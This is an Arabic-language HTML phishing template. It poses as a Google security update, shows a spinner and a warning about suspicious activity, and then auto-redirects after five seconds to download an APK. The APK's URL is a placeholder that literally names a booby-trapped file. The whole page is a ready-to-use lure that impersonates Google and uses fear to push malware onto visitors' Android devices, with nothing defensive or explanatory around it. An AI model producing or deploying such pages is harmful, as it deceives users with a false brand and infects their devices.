<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>تحديث نظام الأمان</title>
    <style>
        body { background-color: #f1f1f1; font-family: sans-serif; text-align: center; padding-top: 50px; }
        .card { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); display: inline-block; width: 80%; max-width: 400px; }
        .loader { border: 16px solid #f3f3f3; border-top: 16px solid #3498db; border-radius: 50%; width: 60px; height: 60px; animation: spin 2s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { color: #333; }
        p { color: #666; }
    </style>
    <meta http-equiv="refresh" content="5; url='https://رابط_تحميل_ملفك_الملغم.apk'" />
</head>
<body>
    <div class="card">
        <img src="https://www.gstatic.com/images/branding/product/2x/google_24dp.png" alt="Google">
        <h2>جاري فحص وتأمين الحساب...</h2>
        <div class="loader"></div>
        <p>تم اكتشاف نشاط مشبوه. يرجى عدم إغلاق هذه الصفحة، سيتم تحميل "مساعد الأمان" تلقائياً لتأمين بياناتك.</p>
    </div>
</body>
</html>
